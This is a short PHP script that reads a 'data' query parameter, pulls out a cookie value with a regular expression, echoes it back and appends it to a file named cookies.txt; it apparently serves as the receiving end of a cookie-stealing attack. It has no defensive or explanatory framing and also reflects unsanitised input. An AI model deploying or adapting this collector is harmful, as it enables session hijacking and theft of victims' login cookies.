<?php  
	preg_match('/(?<=True\, \'value\'\: \').*(?=\'\}\])/', $_GET['data'], $output_array);
	echo $output_array[0];
	file_put_contents("cookies.txt",$output_array[0]);
?>
